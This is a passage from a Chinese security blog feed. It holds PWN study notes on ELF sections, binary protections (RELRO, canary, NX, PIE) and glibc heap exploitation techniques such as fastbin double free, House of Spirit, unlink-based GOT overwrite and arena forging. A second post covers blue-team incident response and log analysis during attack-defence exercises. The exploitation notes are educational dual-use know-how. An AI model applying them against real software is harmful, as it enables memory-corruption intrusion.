0。</td></tr><tr><td>.line</td><td>SHT_PROGBITS</td><td>(无)</td><td>此节区包含符号调试的行号信息，其中描述了源程序与机器指令之间的对应关系。其内容是未定义的。</td></tr><tr><td>.note</td><td>SHT_NOTE</td><td>(无)</td><td>此节区中包含注释信息，有独立的格式。</td></tr><tr><td>.plt</td><td>SHT_PROGBITS</td><td></td><td>此节区包含过程链接表（procedure linkage table）。</td></tr><tr><td>.relname .relaname</td><td>SHT_REL SHT_RELA</td><td></td><td>这些节区中包含了重定位信息。如果文件中包含可加载的段，段中有重定位内容，节区的属性将包含 SHF_ALLOC 位，否则该位置 0。传统上 name 根据重定位所适用的节区给定。例如 .text  节区的重定位节区名字将是：.rel.text 或者 .rela.text。</td></tr><tr><td>.rodata .rodata1</td><td>SHT_PROGBITS</td><td>SHF_ALLOC</td><td>这些节区包含只读数据，这些数据通常参与进程映像的不可写段</td></tr><tr><td>.shstrtab</td><td>SHT_STRTAB</td><td></td><td>此节区包含节区名称。</td></tr><tr><td>.strtab</td><td>SHT_STRTAB</td><td></td><td>此节区包含字符串，通常是代表与符号表项相关的名称。如果文件拥有一个可加载的段，段中包含符号串表，节区的属性将包含SHF_ALLOC 位，否则该位为 0。</td></tr><tr><td>.symtab</td><td>SHT_SYMTAB</td><td></td><td>此节区包含一个符号表。如果文件中包含一个可加载的段，并且该段中包含符号表，那么节区的属性中包含SHF_ALLOC 位，否则该位置为 0</td></tr><tr><td>.text</td><td>SHT_PROGBITS</td><td>SHF_ALLOC + SHF_EXECINSTR</td><td>此节区包含程序的可执行指令。</td></tr></tbody></table><p><a href="https://blog.csdn.net/mergerly/article/details/94585901" target="_blank" rel="noopener">ELF格式详细资料</a></p><h1 id="申请内存的系统调用"><a class="markdownIt-Anchor" href="#申请内存的系统调用"></a> 申请内存的系统调用</h1><h2 id="程序的装载与进程的执行"><a class="markdownIt-Anchor" href="#程序的装载与进程的执行"></a> 程序的装载与进程的执行</h2><h3 id="静态链接程序的执行过程"><a class="markdownIt-Anchor" href="#静态链接程序的执行过程"></a> 静态链接程序的执行过程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201211163826421.png" alt="image-20201211163826421" /></p><p>基本执行过程可以表述为<code>创建子进程 -&gt; 开始执行该程序with argv and envp -&gt; sys_execve() -&gt; do_execve() -&gt; search_binary_handler() -&gt; load_elf_binary() -&gt; _start -&gt; main()</code>，主要表示子进程执行，加载.text节的_start，执行main函数</p><h3 id="动态链接程序的执行过程"><a class="markdownIt-Anchor" href="#动态链接程序的执行过程"></a> 动态链接程序的执行过程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201211163854772.png" alt="image-20201211163854772" /></p><p>动态与静态不同之处在于==子进程执行之后，<a href="http://xn--ld-cr5c912u.so" target="_blank" rel="noopener">加载ld.so</a>，然后才到_start，之后加载got表里的__libc_strat_main()，加载.init节，开始main函数；<code>动态链接程序装载进入内存时加载库代码解析外部引用</code>；<code>链接器在编译链接时将库代码加入到可执行程序中</code></p><h1 id="保护措施"><a class="markdownIt-Anchor" href="#保护措施"></a> 保护措施</h1><h2 id="1relro"><a class="markdownIt-Anchor" href="#1relro"></a> 【1】RELRO：</h2><p>GOT覆盖方法，GOT覆盖之所以能成功是因为默认编译的应用程序的重定位表段对应数据区域是可写的（如got.plt），这与链接器和加载器的运行机制有关，默认情况下应用程序的导入函数只有在调用时才去执行加载（所谓的懒加载，非内联或显示通过dlxxx指定直接加载），如果让这样的数据区域属性变成只读将大大增加安全性。RELRO（read only relocation）是一种用于加强对 binary 数据段的保护的技术，大概实现由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p><p>RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表</p><p>Partial RELRO</p><pre><code>现在gcc 默认编译就是 partial relrosome sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loadernon-PLT GOT is read-only (.got)GOT is still writeable (.got.plt)</code></pre><p>Full RELRO</p><pre><code>拥有 Partial RELRO 的所有特性lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析bonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover,since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized. GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function。</code></pre><h2 id="2stack"><a class="markdownIt-Anchor" href="#2stack"></a> 【2】Stack：</h2><p>如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</p><h2 id="3nx"><a class="markdownIt-Anchor" href="#3nx"></a> 【3】NX：</h2><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过</p><h2 id="4pie"><a class="markdownIt-Anchor" href="#4pie"></a> 【4】PIE：</h2><p>PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址</p><h2 id="5fortify"><a class="markdownIt-Anchor" href="#5fortify"></a> 【5】FORTIFY：</h2><p>FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p><p><a href="https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">参考资料</a></p><h1 id="小技巧"><a class="markdownIt-Anchor" href="#小技巧"></a> 小技巧</h1><h2 id="检查保护"><a class="markdownIt-Anchor" href="#检查保护"></a> 检查保护</h2><p>checksec</p><h2 id="查找system函数的plt地址"><a class="markdownIt-Anchor" href="#查找system函数的plt地址"></a> 查找system函数的plt地址</h2><p>objdump -d -j .plt ./xx |grep system</p><h2 id="查找bin_sh字符串地址"><a class="markdownIt-Anchor" href="#查找bin_sh字符串地址"></a> 查找bin_sh字符串地址</h2><p>ROPgadget --binary ./xx --string “/bin/sh”</p><h2 id="替换alarm函数"><a class="markdownIt-Anchor" href="#替换alarm函数"></a> 替换alarm函数</h2><p>sed -i s/alarm/isnan/g ./pwn</p><h2 id="environ泄露栈地址"><a class="markdownIt-Anchor" href="#environ泄露栈地址"></a> environ泄露栈地址</h2><p>libc 中定义的全局变量 <code>environ</code> 指向环境变量表。而环境变量表存在于栈上，所以通过 <code>environ</code> 指针的值就可以泄露出栈地址。</p><p>peda：vmmap libc -&gt;vmmap stack -&gt;shell nm -D YOURLIBC | grep environ -&gt; x/gx environOffset + libcAddress(in vmmap libc) =point to address(EnvironAddress) -&gt; x/5gx EnvironAddress(get StackAddress)  -&gt; x/5s StackAddress</p><h2 id="查看chunk信息"><a class="markdownIt-Anchor" href="#查看chunk信息"></a> 查看chunk信息</h2><p>p/x *(struct malloc_chunk*)Address</p><h1 id="libc利用思路"><a class="markdownIt-Anchor" href="#libc利用思路"></a> libc利用思路</h1><p>获取方法：GOT，栈，堆</p><p>GOT：已知函数的address与offset相减，得到libc的offset(libc base)；libc offset(base) 与system offset 相加得到 system address</p><h1 id="uaf"><a class="markdownIt-Anchor" href="#uaf"></a> UAF</h1><ul><li>和chunk,bin等heap的内部操作没有什么关系</li><li><code>思路:</code>让程序有两个指针指向同一块内存<ul><li>一块是structure, 另一块是用作data buffer</li><li>利用对buffer的读写, 修改或泄露structure的内容</li></ul></li><li>重新malloc(=q)一样的大小,会拿到曾经free掉得chunk, 此时就存在两个指针p,q指向同一块内存,使用这两个指针的操作会混在一起<ul><li>例如:  C++程序, 有vtable指针用来找出实际的function. 如果另一个是可写入的data buffer, 就可以改掉 function pointer</li></ul></li><li>只要实际的chunk size 相同, malloc 要求的大小不同也没关系</li><li>会拿出哪个chunk, 取决于heap里bin的运作方式,不一定是最近free的那个</li></ul><h1 id="fastbin-corruption"><a class="markdownIt-Anchor" href="#fastbin-corruption"></a> Fastbin Corruption</h1><h2 id="fastbin-2"><a class="markdownIt-Anchor" href="#fastbin-2"></a> Fastbin</h2><ul><li><p>Chunk size&lt;= get_max_fast()的chunk,会被放在一系列称为fastbin 的bin里</p><ul><li>64bit是128 bytes , 32 bit是64 bytes</li><li>global_max_fast一开始是0</li></ul></li><li><p>Fastbin是 single linked list，只使用fd,以NULL结尾.</p></li><li><p>LIFO</p></li><li><p>Chunk size 32(实际使用可以使用24) 从开始, 共7个可用的 fastbin,管理 16、24、32、40、48、56、64 Bytes 的 free chunks（32位下默认）[初始化]. 最大到88 Bytes</p></li><li><p>free时不取消下个chunk的prev_inuse bit, 因为Fastbin chunk 不会和其他chunk合并</p></li><li><p>malloc, free操作时glibc会有些检查,确认heap metadata 是否正确, 避免一些可能的攻击方式</p></li><li><p>为了执行效率, fastbin 里的检查比其他类型的bin 少很多</p></li><li><p>malloc时, Fastbin 是从头开始遍历的, 因为是单向链表</p></li><li><p>其中的 chunk 的 in_use 位（下一个物理相邻的 chunk 的 P 位）总为1</p></li></ul><h3 id="fastbin-sanity-check检查机制"><a class="markdownIt-Anchor" href="#fastbin-sanity-check检查机制"></a> Fastbin Sanity Check(检查机制)</h3><ul><li>malloc 从 bin 里取出时, 要从正确的 bin 里拿出来, 即chunk size 要正确</li><li>free时, nextchunk的size要正确</li><li>free时会检查 bin 里第一个 chunk 是不是要跟当前要free的这一个相同(fasttop)</li></ul><h2 id="fastbin-corruption-2"><a class="markdownIt-Anchor" href="#fastbin-corruption-2"></a> Fastbin Corruption</h2><ul><li>让fastbin linked list指向任意位置, 之后malloc时就会将该位置做为chunk拿出来</li><li>Freed (not inuse) chunk才会存在bin里, 修改它的fd才会造成corruption</li></ul><h1 id="fastbin-double-free"><a class="markdownIt-Anchor" href="#fastbin-double-free"></a> Fastbin Double free</h1><ul><li><p>Fasttop只检查bin里面第一个chunk,只要不是连续free同一个chunk就没有问题</p><ul><li>比如:free§;free(q);free§;</li></ul></li><li><p>可以造成类似use  after free 的效果, 可以改掉还在bin里的chunk之fd栏位</p></li><li><p>FastBin是由fd串起来的linked list, 该掉fd可以让linked list接往任意地址, 多次malloc后, 就会拿到一个位置可以控制的chunk</p></li><li><p>取出来的chunk其size栏位要正确, 所以并非是完全任意地址, 要能构造假的size</p><ul><li>用stack上的变量当做size, 可以malloc出一个stack上的地址</li><li>GOT上, 用64bit位地址常见的0x40当做size</li></ul></li><li><p>取得chunk后, 有机会对该地址任意读写</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201214173531508.png" alt="image-20201214173531508" /></p></li></ul><h1 id="heap-overflow"><a class="markdownIt-Anchor" href="#heap-overflow"></a> Heap Overflow</h1><ul><li>如果有heap overflow, 可以覆盖下个chunk的fd指针</li><li>先free掉下一个chunk再进行overflow</li><li>overflow时要注意下个chunk的size是否正确</li><li>跳转got,改掉got,执行改掉的函数,getshell</li></ul><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201217141934611.png" alt="image-20201217141934611" /></p><h1 id="fastbin-house-of-spirit"><a class="markdownIt-Anchor" href="#fastbin-house-of-spirit"></a> Fastbin House of spirit</h1><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>​要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>其他overflow可以改掉一个原本由malloc得到的指针p, free§时就会使得被改掉的指针进入fastbin, 下次malloc时就会拿到<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201217145458950.png" alt="image-20201217145458950" /></p><h1 id="unlink-exploitation"><a class="markdownIt-Anchor" href="#unlink-exploitation"></a> Unlink Exploitation</h1><ul><li>合并freed chunks</li></ul><p>非Fastbin chunk 在free掉时, 会和前后的freed chunks合并</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/* consolidate backward */</span><br>   <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>     prevsize = prev_size (p);<br>     <span class="hljs-built_in">size</span> += prevsize;<br>     p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>     <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>       malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size while consolidating"</span>);<br>     unlink_chunk (av, p);<br>   &#125;<br><br>   <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>     <span class="hljs-comment">/* get and clear inuse bit */</span><br>     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>     <span class="hljs-comment">/* consolidate forward */</span><br>     <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink_chunk (av, nextchunk);<br><span class="hljs-built_in">size</span> += nextsize;<br>     &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><ul><li>unlink()是用来把chunk移出bin用的, 从double linked-list移除</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(P, BK, FD)&#123;\\简化版本</span><br>BK=p-&gt;bk;<br>FD=p-&gt;fd;<br>BK-&gt;fd=FD;<br>FD-&gt;bk=BK;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用unlink()</p><ul><li>如果有overflow可以覆盖到某个chunk q的 prevsize, free q时传入unlink§的p可以控制</li><li>慎选p使得chunk p的内容也可控制</li><li>利用FD-&gt;bk = BK和BK-&gt;fd = FD, 可以同时写入两个目标, 例如:<ul><li>FD = p-&gt;fd = free@got.plt - 0x18</li><li>BK = p-&gt;bk = shellcode</li></ul></li><li>现在版本: 实际的unlink会检查double linked-list 是不是合法<ul><li>指过去要能指回来, 即p-&gt;fd-&gt;bk == p</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(P, BK, FD) &#123;</span><br>FD = p-&gt;fd;<br>BK = p-&gt;bk;<br><span class="hljs-keyword">if</span> (FD-&gt;bk !=P || BK-&gt;fd !=P)<br>malloc_printerr(check_action, <span class="hljs-string">"corrupted d..."</span>, P);<br><span class="hljs-keyword">else</span> &#123;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Overwrite Heap Pointer<ul><li>实际上unlink的检查还是有方法绕过, 而且可以得到一种很实用的利用方式</li><li>需要有:<ul><li>一个指向heap内的指针</li><li>存放该指针的位置已知(例如: 该指针是全局变量)</li><li>可以对该指针写入多次</li></ul></li></ul></li></ul><h1 id="伪造arena"><a class="markdownIt-Anchor" href="#伪造arena"></a> 伪造Arena</h1><ul><li>平常使用的arena是在libc内部的main_arena变量</li><li>malloc时其实会根据tls段上面的某段指针, 决定要使用的arena</li><li>mmap chunk overflow时可以盖掉arena指针<ul><li>tls段上还有stack address, stack guard canary</li></ul></li><li>伪造arena的Fastbin部分, 使得下次malloc时可以取得伪造的chunk</li><li>这个利用方式需要任意大小的malloc,但是不需要free</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全值守服务and日志分析</title>
      <link href="/2020/12/04/%E5%AE%89%E5%85%A8%E5%80%BC%E5%AE%88%E6%9C%8D%E5%8A%A1and%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/04/%E5%AE%89%E5%85%A8%E5%80%BC%E5%AE%88%E6%9C%8D%E5%8A%A1and%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安全值守基本内容"><a class="markdownIt-Anchor" href="#安全值守基本内容"></a> 安全值守基本内容</h1><ul><li>信息系统状态监控</li><li>安全设备健康状态检查</li><li>安全设备进行日志分析</li><li>现场问题分析跟踪处理</li></ul><h1 id="服务"><a class="markdownIt-Anchor" href="#服务"></a> 服务</h1><h2 id="服务原则"><a class="markdownIt-Anchor" href="#服务原则"></a> 服务原则</h2><ul><li>保密性原则</li><li>标准性原则</li><li>规范性原则</li></ul><h2 id="现场服务"><a class="markdownIt-Anchor" href="#现场服务"></a> 现场服务</h2><ul><li><p>安全值守服务</p></li><li><p>安全漏洞扫描</p></li><li><p>主机安全检查</p></li><li><p>安全值守服务</p></li><li><p>安全日志分析</p></li><li><p>应急响应服务</p><p>非现场服务一般包括下列内容：</p></li><li><p>信息安全通告</p></li><li><p>信息安全咨询</p></li><li><p>对外服务检查</p></li><li><p>WEB站点渗透测试</p></li><li><p>网站安全监测服务</p></li></ul><h2 id="服务内容"><a class="markdownIt-Anchor" href="#服务内容"></a> 服务内容</h2><ul><li>信息安全通告</li><li>信息安全咨询</li><li>对外服务检查</li><li>WEB站点渗透测试</li><li>安全漏洞扫描</li><li>主机安全检查</li><li>网站安全监测服务</li><li>安全值守服务</li><li>日志分析</li><li>应急响应服务<ul><li>事件初期：支持申请-&gt;初步判断事件类型-&gt;启动紧急响应</li><li>紧急响应实施：-&gt;信息收集-&gt;事件分析-&gt;事件处理</li><li>报告与汇报：-&gt;记录整理-&gt;报告输出与提出-&gt;整体汇报</li></ul></li></ul><h2 id="服务流程"><a class="markdownIt-Anchor" href="#服务流程"></a> 服务流程</h2><p><strong>安全漏洞通告</strong> 和 <strong>信息安全咨询</strong> 贯穿整个安全保障服务</p><p><strong>重要活动开始前：</strong></p><ul><li>对外服务检查</li><li>安全漏洞扫描</li><li>WEB站点渗透测试</li><li>主机安全检查</li></ul><p><strong>重要活动进行中：</strong></p><ul><li>网站安全监测</li><li>安全日志分析</li><li>安全运维值守</li><li>应急响应</li></ul><p><strong>重要活动结束后：</strong> 成果汇报</p><h1 id="快速应急响应技术"><a class="markdownIt-Anchor" href="#快速应急响应技术"></a> 快速应急响应技术</h1><h2 id="护网行动应急响应概述"><a class="markdownIt-Anchor" href="#护网行动应急响应概述"></a> 护网行动应急响应概述</h2><p>护网行动是公安部门为检验国家关键信息基础设施安全防护和应急处置能力，而开展的网络安全攻防演练，会邀请国内安全企业和部分甲方企业作为攻击方：</p><ul><li>采取==“单盲式”==，即 <strong>攻击时间不固定，攻击源不明确，攻击目标不明确，攻击手段不明确</strong></li><li>以获取目标<mark>系统权限、数据</mark>为得分点开展模拟攻击</li><li>企业作为防守方以<mark>发现</mark>入侵事件、<mark>处置</mark>事件、配合执法机关<mark>取证</mark>为目标获取得分</li></ul><p>由于攻击面广、攻击路径不定，在护网行动期间用户系统被攻击丢分在所难免：</p><p>---- 如何<mark>快速定位、快速分析</mark>安全入侵、攻击事件，<mark>快速取证</mark>并<mark>及时上报</mark>得分就显得尤为重要</p><h2 id="快速识别安全事件"><a class="markdownIt-Anchor" href="#快速识别安全事件"></a> 快速识别安全事件</h2><h3 id="常见安全事件"><a class="markdownIt-Anchor" href="#常见安全事件"></a> 常见安全事件</h3><ul><li><p>常见安全事件</p><ul><li>入侵事件<ul><li>主机、服务器被入侵</li><li>WEB站点入侵</li></ul></li><li>信息泄露事件<ul><li>敏感信息泄露</li><li>用户弱口令</li><li>源代码泄露</li></ul></li><li>web应用安全事件<ul><li>SQL注入</li><li>XSS</li><li>XXE</li><li>短信炸弹</li><li>…</li></ul></li></ul></li><li><p>常见安全攻击思路</p></li></ul><p>思路有但不限于：社会工程学，业务逻辑，弱口令，Nday，APP，注入攻击，边角系统，废弃资产，邮件，上传getshell，Struts 2，Weblogic，未授权访问，WIFI，数据库，vpn等等</p><h3 id="如何发现安全事件"><a class="markdownIt-Anchor" href="#如何发现安全事件"></a> 如何发现安全事件</h3><ul><li>常用主动发现技术<ul><li>日志分析<ul><li>安全设备日志</li><li>主机日志</li><li>中间件日志</li><li>应用程序日志</li></ul></li><li>恶意文件监控<ul><li>木马</li><li>webshell</li><li>其他可疑文件</li></ul></li><li>安全威胁情报</li></ul></li><li>常用被动发现场景<ul><li>系统运维报告异常<ul><li>网络丢包</li><li>系统频繁重启</li><li>系统蓝屏</li><li>系统资源占用率过高</li></ul></li><li>业务用户投诉或抱怨<ul><li>用户收到异常短信</li><li>用户异常退出登陆</li></ul></li><li>被通报</li></ul></li></ul><h3 id="如何判断影响范围"><a class="markdownIt-Anchor" href="#如何判断影响范围"></a> 如何判断影响范围</h3><ul><li>异常主机所处网络环境<ul><li>内网接入口</li><li>外来接入口</li><li>单台主机 or 多台主机</li><li>已被感染 or 处于危险中</li></ul></li><li>异常主机用途<ul><li>个人办公主机</li><li>特殊权限主机</li><li>工控主机</li><li>应用服务器</li><li>数据库服务器</li><li>域控服务器</li></ul></li></ul><h2 id="快速分析与侦查"><a class="markdownIt-Anchor" href="#快速分析与侦查"></a> 快速分析与侦查</h2><h3 id="三要素"><a class="markdownIt-Anchor" href="#三要素"></a> 三要素</h3><h4 id="时间"><a class="markdownIt-Anchor" href="#时间"></a> 时间</h4><ul><li>攻击发现时间<ul><li>报案时间</li></ul></li><li>后门文件时间<ul><li>Windows</li><li>Linux</li></ul></li><li>异常时间段<ul><li>web访问日志</li><li>操作系统日志</li><li>安全设备日志</li></ul></li></ul><h4 id="地点"><a class="markdownIt-Anchor" href="#地点"></a> 地点</h4><ul><li>恶意文件首次出现目录<ul><li>文件上传</li><li>代码执行</li></ul></li><li>残留文件所在目录<ul><li>自动化攻击</li><li>认为上传\下载</li></ul></li></ul><h4 id="事件"><a class="markdownIt-Anchor" href="#事件"></a> 事件</h4><ul><li>应用后台日志<ul><li>登陆日志</li><li>上传点</li></ul></li><li>安全设备日志<ul><li>暴力破解</li><li>恶意文件上传</li><li>SQL注入</li></ul></li><li>对外应用访问日志<ul><li>FTP访问日志</li><li>SSH认证日志</li><li>远程桌面日志</li></ul></li><li>系统日志<ul><li>web运行账户</li><li>root用户</li><li>易受攻击账户</li></ul></li></ul><h3 id="回溯攻击法"><a class="markdownIt-Anchor" href="#回溯攻击法"></a> 回溯攻击法</h3><p><strong>护网行动中常见的安全风险：</strong></p><ul><li>主机监听端口整理<ul><li>异常被监听端口</li><li>异常会话链接</li></ul></li><li>代码/命令执行<ul><li>weblogic</li><li>Struts 2</li><li>JBoss</li><li>ThinkPHP</li><li>MS17-010</li><li>Fastjson</li></ul></li><li>弱口令<ul><li>web应用弱口令</li><li>中间件弱口令</li><li>数据库</li><li>ssh、ftp、rdp</li></ul></li><li>钓鱼邮件<ul><li>恶意word</li><li>恶意PPT</li><li>恶意链接</li><li>信息收集</li></ul></li><li>常见web漏洞<ul><li>SQL注入</li><li>XSS</li><li>XXE</li><li>越权操作</li><li>任意文件读取</li></ul></li><li>文件上传风险<ul><li>头像</li><li>附件</li><li>图标</li></ul></li></ul><h3 id="经验法"><a class="markdownIt-Anchor" href="#经验法"></a> 经验法</h3><ul><li>攻击常用目录<ul><li>中间件根目录</li><li>文件上传目录</li><li>/var/tmp</li><li>默认下载路径:C:\Users\Account\Downloads</li><li>apache-tomcat-*/conf/tomcat-users.xml</li><li>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</li><li>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</li><li>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/</li><li>servers/AdminServer/tmp/_WL_internal/wls-wsat/</li></ul></li><li>社会工程学常见手法<ul><li>恶意邮件<ul><li>CVE-2018-0802</li><li>CVE-2017-8570</li><li>CVE-2017-11882</li></ul></li><li>钓鱼网站<ul><li>信息收集</li><li>远程代码执行<ul><li>CVE-2018-15982</li><li>CVE-2018-4878</li></ul></li></ul></li><li>微信<ul><li>假扮系统维护人员索要系统账号</li></ul></li></ul></li><li>常见服务端口<ul><li>21 : FTP(未授权访问、弱口令)</li><li>22 : SSH(弱口令)</li><li>23 : Telnet(未授权访问、弱口令)</li><li>445 : SMB(远程命令执行)</li><li>1433 : MSSQL(弱口令、提权)</li><li>3306 : MySQL（弱口令、提权)</li><li>3389 : RDP(弱口令、远程代码执行)</li><li>7001 : weblogic (弱口令、SSRF、反序列化)</li><li>8080 : Tomcat(启用PUT方法、弱口令)</li><li>27017 : MongoDB(未授权访问)</li></ul></li></ul><h2 id="快速取证与隔离"><a class="markdownIt-Anchor" href="#快速取证与隔离"></a> 快速取证与隔离</h2><h3 id="常用工具及脚本"><a class="markdownIt-Anchor" href="#常用工具及脚本"></a> 常用工具及脚本</h3><ul><li>TcpvVew</li><li>AutoRuns</li><li>WebShell查杀工具-D盾、findwebshell</li><li>日志工具<ul><li>Windows<ul><li>Sublime/UE</li><li>LogParser/LogParser Lizard</li><li>Event log Explorer-可以查看内核级日志</li></ul></li><li>web应用<ul><li>WebLog Expert</li></ul></li><li>Linux<ul><li>Goaccess-分析结果可以以HTML格式呈现</li><li>grep、cat、more、less、awk</li></ul></li></ul></li></ul><p>日志分析思路</p><ul><li>应用被入侵<ul><li>Web/FTP日志-IP地址</li><li>数据库日志/应用日志-访问操作、时间</li><li>系统日志-系统操作、用户</li></ul></li><li>怎么判断日志中异常<ul><li>时间</li><li>频率</li><li>来源</li><li>恶意代码</li></ul></li></ul><h3 id="取证对象及流程"><a class="markdownIt-Anchor" href="#取证对象及流程"></a> 取证对象及流程</h3><ul><li>取证过程<ul><li>保护第一现场<ul><li>避免攻击痕迹被清除</li></ul></li><li>按照经验法、回溯攻击法、三要素法开展应急响应工作</li><li>不轻信一面之词<ul><li>与目击者交流相关细节</li><li>亲自核实所述、转述情况</li></ul></li><li>病毒/木马文件</li><li>日志文件<ul><li>主机日志</li><li>应用日志</li><li>安全设备日志</li></ul></li><li>攻击者残留文件</li><li>在主机上抓取的流量包</li></ul></li><li>常用快速隔离方法<ul><li>已经发生安全事件的对象<ul><li>采取例如断网、下线等可行的措施进行隔离，避免影响其他主机</li><li>通过边界控制设备，防止网络区域间相互影响</li></ul></li><li>对于处于危险中的对象<ul><li>采取及时的补救加固措施</li><li>相关漏洞的扫描修补与跟踪</li><li>进行黑盒白盒安全测试</li></ul></li></ul></li></ul><h1 id="告警日志分析技术"><a class="markdownIt-Anchor" href="#告警日志分析技术"></a> 告警日志分析技术</h1><h2 id="快速分析常见攻击"><a class="markdownIt-Anchor" href="#快速分析常见攻击"></a> 快速分析常见攻击</h2><h3 id="常见告警日志"><a class="markdownIt-Anchor" href="#常见告警日志"></a> 常见告警日志</h3><h4 id="基于waf的常见web安全攻击类型"><a class="markdownIt-Anchor" href="#基于waf的常见web安全攻击类型"></a> 基于WAF的常见web安全攻击类型</h4><ul><li>xss跨站脚本攻击</li><li>SQL注入漏洞</li><li>CSRF</li><li>任意文件遍历/下载</li><li>文件上传导致任意代码执行</li><li>文件包含</li><li>命令执行</li><li>敏感信息泄露</li><li>未授权访问/权限绕过</li></ul><h4 id="基于idsips的常见漏洞攻击类型介绍"><a class="markdownIt-Anchor" href="#基于idsips的常见漏洞攻击类型介绍"></a> 基于IDS/IPS的常见漏洞攻击类型介绍</h4><ul><li>系统漏洞攻击</li><li>蠕虫病毒攻击</li><li>注入攻击</li><li>后门木马攻击</li><li>暴力猜解攻击</li><li>缓冲区溢出攻击命令执行</li><li>扫描探测攻击</li><li>弱口令行为</li></ul><h4 id="基于adsnat的常见ddos攻击类型介绍"><a class="markdownIt-Anchor" href="#基于adsnat的常见ddos攻击类型介绍"></a> 基于ADS/NAT的常见DDOS攻击类型介绍</h4><ul><li>SYN Flood攻击</li><li>ACK Flood攻击</li><li>UDP Flood攻击</li><li>ICMP Flood攻击</li><li>HTTP Get Flood攻击</li></ul><h4 id="基于tac的常见恶意代码攻击类型介绍"><a class="markdownIt-Anchor" href="#基于tac的常见恶意代码攻击类型介绍"></a> 基于TAC的常见恶意代码攻击类型介绍</h4><ul><li>木马攻击</li><li>蠕虫攻击</li><li>宏病毒攻击</li><li>脚本病毒攻击</li></ul><h3 id="常见攻击类型和特征"><a class="markdownIt-Anchor" href="#常见攻击类型和特征"></a> 常见攻击类型和特征</h3><ul><li><p>远程代码执行类</p><ul><li>spring框架远程代码执行漏洞利用</li><li>Apache Struts 2远程代码执行漏洞利用</li><li>Elastic 